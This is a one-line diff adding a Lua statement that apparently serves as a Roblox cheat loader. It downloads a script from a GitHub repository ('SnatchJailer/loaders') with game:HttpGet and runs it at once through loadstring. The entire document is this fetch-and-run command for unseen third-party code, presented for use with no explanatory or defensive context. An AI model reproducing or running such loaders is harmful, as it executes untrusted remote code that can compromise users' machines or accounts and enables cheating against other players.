@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/event-sniper-arena-spam2-on1458d8lzpogo.lua"))()
